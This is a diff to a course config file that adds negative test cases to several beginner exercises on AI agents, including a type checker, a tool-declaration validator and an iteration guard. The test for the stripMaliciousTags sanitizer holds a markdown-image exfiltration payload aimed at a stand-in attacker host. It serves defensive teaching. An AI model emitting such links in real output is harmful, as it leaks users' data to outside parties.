@@ -100,7 +100,7 @@ export const AI_30_DAYS_CONFIGS: DayConfig[] = [
     "aDesc": "Implement function validateType(value, expectedType) returning true if typeof matches.",
     "aStarter": "function validateType(v, type) {\n  // TODO: write your code here\n}",
     "aHint": "Check Array.isArray or typeof.",
-    "aTest": "if (validateType([1, 2], 'array') !== true || validateType('hello', 'string') !== true) throw new Error('Type checker failed');"
+    "aTest": "if (validateType([1, 2], 'array') !== true || validateType('hello', 'string') !== true) throw new Error('Type checker failed');\nif (validateType('hello', 'number') !== false || validateType({ a: 1 }, 'array') !== false) throw new Error('A value of the wrong type must return false');"
   },
   {
     "day": 6,
@@ -120,7 +120,7 @@ export const AI_30_DAYS_CONFIGS: DayConfig[] = [
     "aDesc": "Implement function isValidToolDeclaration(tool) checking name and description exist.",
     "aStarter": "function isValidToolDeclaration(t) {\n  // TODO: write your code here\n}",
     "aHint": "Check name, description, parameters.",
-    "aTest": "if (isValidToolDeclaration({ name: 'calc', description: 'Calculate', parameters: {} }) !== true) throw new Error('Tool validator failed');"
+    "aTest": "if (isValidToolDeclaration({ name: 'calc', description: 'Calculate', parameters: {} }) !== true) throw new Error('Tool validator failed');\nif (isValidToolDeclaration({ name: 'calc', parameters: {} }) !== false) throw new Error('A tool without a description must be rejected');"
   },
   {
     "day": 7,
@@ -280,7 +280,7 @@ export const AI_30_DAYS_CONFIGS: DayConfig[] = [
     "aDesc": "Implement function stripMaliciousTags(text) removing injected markdown links and script tags.",
     "aStarter": "function stripMaliciousTags(t) {\n  // TODO: write your code here\n}",
     "aHint": "Strip markdown images and scripts.",
-    "aTest": "if (stripMaliciousTags('![exfil](https://attacker.com/leak?data=secret)') !== '') throw new Error('Exfil image strip failed');"
+    "aTest": "if (stripMaliciousTags('![exfil](https://attacker.com/leak?data=secret)') !== '') throw new Error('Exfil image strip failed');\nif (stripMaliciousTags('Hello world') !== 'Hello world') throw new Error('Normal text must be kept as it is');"
   },
   {
     "day": 15,
@@ -340,7 +340,7 @@ export const AI_30_DAYS_CONFIGS: DayConfig[] = [
     "aDesc": "Implement function isMaxIterationsExceeded(currentIter, maxIter = 5) returning true if current >= max.",
     "aStarter": "function isMaxIterationsExceeded(curr, max = 5) {\n  // TODO: write your code here\n}",
     "aHint": "Check curr >= max.",
-    "aTest": "if (isMaxIterationsExceeded(5, 5) !== true) throw new Error('Max iteration guard failed');"
+    "aTest": "if (isMaxIterationsExceeded(5, 5) !== true) throw new Error('Max iteration guard failed');\nif (isMaxIterationsExceeded(2, 5) !== false) throw new Error('2 of 5 iterations is still under the limit');"
   },
   {
     "day": 18,
@@ -420,7 +420,7 @@ export const AI_30_DAYS_CONFIGS: DayConfig[] = [
     "aDesc": "Implement function hasValidReport(res) verifying non-empty finalReport.",
     "aStarter": "function hasValidReport(r) {\n  // TODO: write your code here\n}",
     "aHint": "Check finalReport exists.",
-    "aTest": "if (hasValidReport({ finalReport: 'A complete full research document' }) !== true) throw new Error('Report check failed');"
+    "aTest": "if (hasValidReport({ finalReport: 'A complete full research document' }) !== true) throw new Error('Report check failed');\nif (hasValidReport({ finalReport: '' }) !== false || hasValidReport({}) !== false) throw new Error('An empty or missing report must be rejected');"
   },
   {
     "day": 22,
@@ -480,7 +480,7 @@ export const AI_30_DAYS_CONFIGS: DayConfig[] = [
     "aDesc": "Implement function calcLogProbDelta(p1, p2) returning difference p1 - p2.",
     "aStarter": "function calcLogProbDelta(p1, p2) {\n  // TODO: write your code here\n}",
     "aHint": "Subtract p2 from p1.",
-    "aTest": "if (calcLogProbDelta(-1.5, -2.5) !== 1.0) throw new Error('Delta calc failed');"
+    "aTest": "if (calcLogProbDelta(-1.5, -2.5) !== 1.0) throw new Error('Delta calc failed');\nif (calcLogProbDelta(-0.25, -2) !== 1.75) throw new Error('calcLogProbDelta(-0.25, -2) must be 1.75');"
   },
   {
     "day": 25,
